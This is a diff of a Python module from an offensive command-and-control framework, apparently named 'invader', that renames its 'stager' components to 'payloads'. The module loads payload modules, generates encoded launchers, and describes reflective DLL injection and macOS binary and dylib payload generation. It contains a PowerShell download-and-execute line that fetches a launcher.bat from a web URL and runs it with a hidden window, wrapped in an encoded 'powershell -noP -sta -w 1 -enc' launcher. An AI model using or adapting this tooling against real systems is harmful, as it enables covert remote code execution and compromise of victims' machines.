@@ -1,14 +1,14 @@
 """
 
-Functionality that loads invader stagers, sets generic stager options,
+Functionality that loads invader payloads, sets generic payload options,
 and abstracts the invocation of launcher generation.
 
-The Stagers() class in instantiated in ./invader.py by the main menu and includes:
+The payloads() class in instantiated in ./invader.py by the main menu and includes:
 
-    load_stagers() - loads stagers from the install path
-    set_stager_option() - sets and option for all stagers
+    load_payloads() - loads payloads from the install path
+    set_payload_option() - sets and option for all payloads
     generate_launcher() - abstracted functionality that invokes the generate_launcher() method for a given listener
-    generate_dll() - generates a PowerPick Reflective DLL to inject with base64-encoded stager code
+    generate_dll() - generates a PowerPick Reflective DLL to inject with base64-encoded payload code
     generate_macho() - generates a macho binary with an embedded python interpreter that runs the launcher code
     generate_dylib() - generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application
 
@@ -29,29 +29,29 @@ from ShellcodeRDI import *
 import base64
 
 
-class Stagers:
+class payloads:
 
     def __init__(self, MainMenu, args):
 
         self.mainMenu = MainMenu
         self.args = args
 
-        # stager module format:
-        #     [ ("stager_name", instance) ]
-        self.stagers = {}
+        # payload module format:
+        #     [ ("payload_name", instance) ]
+        self.payloads = {}
 
-        self.load_stagers()
+        self.load_payloads()
 
 
-    def load_stagers(self):
+    def load_payloads(self):
         """
-        Load stagers from the install + "/lib/stagers/*" path
+        Load payloads from the install + "/lib/payloads/*" path
         """
 
-        rootPath = "%s/lib/stagers/" % (self.mainMenu.installPath)
+        rootPath = "%s/lib/payloads/" % (self.mainMenu.installPath)
         pattern = '*.py'
 
-        print helpers.color("[*] Loading stagers from: %s" % (rootPath))
+        print helpers.color("[*] Loading payloads from: %s" % (rootPath))
 
         for root, dirs, files in os.walk(rootPath):
             for filename in fnmatch.filter(files, pattern):
@@ -62,32 +62,32 @@ class Stagers:
                     continue
 
                 # extract just the module name from the full path
-                stagerName = filePath.split("/lib/stagers/")[-1][0:-3]
+                payloadName = filePath.split("/lib/payloads/")[-1][0:-3]
 
                 # instantiate the module and save it to the internal cache
-                self.stagers[stagerName] = imp.load_source(stagerName, filePath).Stager(self.mainMenu, [])
+                self.payloads[payloadName] = imp.load_source(payloadName, filePath).payload(self.mainMenu, [])
 
 
-    def set_stager_option(self, option, value):
+    def set_payload_option(self, option, value):
         """
-        Sets an option for all stagers.
+        Sets an option for all payloads.
         """
 
-        for name, stager in self.stagers.iteritems():
-            for stagerOption,stagerValue in stager.options.iteritems():
-                if stagerOption == option:
-                    stager.options[option]['Value'] = str(value)
+        for name, payload in self.payloads.iteritems():
+            for payloadOption,payloadValue in payload.options.iteritems():
+                if payloadOption == option:
+                    payload.options[option]['Value'] = str(value)
 
     def generate_launcher_fetcher(self, language=None, encode=True, webFile='http://127.0.0.1/launcher.bat', launcher='powershell -noP -sta -w 1 -enc '):
         #TODO add handle for other than powershell language
-        stager = 'wget "' + webFile + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
+        payload = 'wget "' + webFile + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
         if encode:
-            return helpers.powershell_launcher(stager, launcher)
+            return helpers.powershell_launcher(payload, launcher)
         else:
-            return stager
+            return payload
 
 
-    def generate_launcher(self, listenerName, language=None, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', safeChecks='true'):
+    def generate_launcher(self, listenerName, language=None, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', payloadRetries='0', safeChecks='true'):
         """
         Abstracted functionality that invokes the generate_launcher() method for a given listener,
         if it exists.
@@ -99,7 +99,7 @@ class Stagers:
 
         activeListener = self.mainMenu.listeners.activeListeners[listenerName]
 
-        launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_launcher(encode=encode, obfuscate=obfuscate, obfuscationCommand=obfuscationCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, language=language, listenerName=listenerName, safeChecks=safeChecks)
+        launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_launcher(encode=encode, obfuscate=obfuscate, obfuscationCommand=obfuscationCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, payloadRetries=payloadRetries, language=language, listenerName=listenerName, safeChecks=safeChecks)
 
         if launcherCode:
             return launcherCode
@@ -107,7 +107,7 @@ class Stagers:
 
     def generate_dll(self, poshCode, arch):
         """
-        Generate a PowerPick Reflective DLL to inject with base64-encoded stager code.
+        Generate a PowerPick Reflective DLL to inject with base64-encoded payload code.
         """
 
         #read in original DLL and patch the bytes based on arch
